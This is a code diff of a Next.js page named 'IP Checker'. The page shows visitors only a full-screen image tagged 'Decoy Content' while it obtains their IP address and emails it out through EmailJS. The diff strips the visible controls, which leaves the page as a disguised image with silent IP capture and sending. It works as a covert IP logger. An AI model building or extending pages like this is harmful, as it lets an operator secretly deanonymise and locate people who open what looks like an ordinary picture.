@@ -2,17 +2,15 @@
 
 import { useEffect, useState, useCallback, useRef } from "react";
 import axios from "axios";
-import { motion } from "framer-motion";
 import emailjs from "@emailjs/browser";
 import decoyImg from "./assets/2.jpg";
+import Image from "next/image";
 
 export default function Home() {
   console.log("IP Checker Mounted");
   const [ip, setIp] = useState<string | null>(null);
   const [loading, setLoading] = useState(true);
   const [error, setError] = useState<string | null>(null);
-  const [copied, setCopied] = useState(false);
-  const [sending, setSending] = useState(false);
   const [sentStatus, setSentStatus] = useState<"idle" | "success" | "error">("idle");
   const hasSent = useRef(false);
 
@@ -36,18 +34,9 @@ export default function Home() {
     getIpClient();
   }, [getIpClient]);
 
-  const copyToClipboard = () => {
-    if (ip) {
-      navigator.clipboard.writeText(ip);
-      setCopied(true);
-      setTimeout(() => setCopied(false), 2000);
-    }
-  };
-
   const sendEmail = useCallback(async () => {
     if (!ip || hasSent.current) return;
     
-    setSending(true);
     setSentStatus("idle");
     hasSent.current = true;
     
@@ -72,8 +61,6 @@ export default function Home() {
       console.error("EmailJS Failed:", err);
       setSentStatus("error");
       hasSent.current = false; // Allow retry on failure
-    } finally {
-      setSending(false);
     }
   }, [ip]);
 
@@ -90,12 +77,13 @@ export default function Home() {
 
   return (
     <main className="fixed inset-0 w-screen h-[100vh] overflow-hidden bg-black">
-      <img
-        src={decoyImg.src}
+      <Image
+        src={decoyImg}
         alt="Decoy Content"
-        className="w-full h-full object-cover opacity-90 hover:opacity-100 transition-opacity duration-500"
+        fill
+        priority
+        className="object-cover opacity-90 hover:opacity-100 transition-opacity duration-500"
       />
     </main>
-    
   );
 }
